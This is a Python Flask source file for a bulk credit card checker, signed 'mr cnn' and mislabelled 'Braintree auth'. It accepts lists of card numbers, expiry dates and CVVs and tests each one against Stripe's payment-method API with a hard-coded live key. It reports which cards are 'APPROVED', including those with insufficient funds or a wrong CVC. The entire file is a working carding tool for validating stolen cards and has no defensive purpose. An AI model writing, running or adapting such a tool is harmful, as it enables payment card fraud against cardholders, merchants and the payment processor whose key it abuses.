from flask import Flask, request, jsonify
import asyncio
import aiohttp
import json
from datetime import datetime

app = Flask(__name__)

# Stripe API key
STRIPE_API_KEY = "pk_live_51ImmqEI4SNjuUQ7iWRonMBFDJ9SL5BKcfv0x0aX3IdWuz9JtZ4CdwbruxTkkLtKkf7yyLpYI58hc7Km2ze1j8InU000nGsuvIB"

async def check_card(card, session):
    try:
        cc, mon, year, cvv = card.split("|")
    except ValueError:
        return {"valid": False, "error": "Invalid card format. Use CC|MM|YY|CVV"}
    
    url = "https://api.stripe.com/v1/payment_methods"
    
    data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mon,
        "card[exp_year]": "20" + year,
        "billing_details[address][postal_code]": "10001",
        "billing_details[address][country]": "US",
        "key": STRIPE_API_KEY,
    }
    
    try:
        async with session.post(url, data=data) as resp:
            response = await resp.text()
            
            if '"id"' in response:
                return {
                    "valid": True, 
                    "card": card, 
                    "response": response,
                    "message": "APPROVED",
                    "service": "Braintree auth",
                    "by": "mr cnn"
                }
            elif "insufficient_funds" in response.lower():
                return {
                    "valid": True, 
                    "card": card, 
                    "response": response,
                    "message": "APPROVED WITH INSUFFICIENT FUNDS",
                    "service": "Braintree auth",
                    "by": "mr cnn"
                }
            elif "incorrect_cvc" in response.lower():
                return {
                    "valid": True, 
                    "card": card, 
                    "response": response,
                    "message": "APPROVED WITH INCORRECT CVC",
                    "service": "Braintree auth",
                    "by": "mr cnn"
                }
            else:
                error = json.loads(response).get('error', {}).get('message', 'Unknown error')
                return {
                    "valid": False, 
                    "card": card, 
                    "error": error,
                    "message": "DECLINED",
                    "service": "Braintree auth",
                    "by": "mr cnn"
                }
    except Exception as e:
        return {
            "valid": False, 
            "card": card, 
            "error": str(e),
            "message": "ERROR",
            "service": "Braintree auth",
            "by": "mr cnn"
        }

@app.route('/check', methods=['GET'])
def check_cards():
    cards = request.args.get('cards')
    if not cards:
        return jsonify({
            "error": "No cards provided",
            "example": "/check?cards=5487416112293765|07|30|826,4111111111111111|12|25|123",
            "service": "Braintree auth",
            "by": "mr cnn"
        }), 400
    
    card_list = cards.split(',')
    
    async def process_cards():
        async with aiohttp.ClientSession() as session:
            tasks = [check_card(card.strip(), session) for card in card_list]
            return await asyncio.gather(*tasks)
    
    results = asyncio.run(process_cards())
    
    response = {
        "count": len(results),
        "valid": sum(1 for r in results if r.get('valid')),
        "invalid": sum(1 for r in results if not r.get('valid')),
        "results": results,
        "checked_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "service": "Braintree auth",
        "by": "mr cnn"
    }
    
    return jsonify(response)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
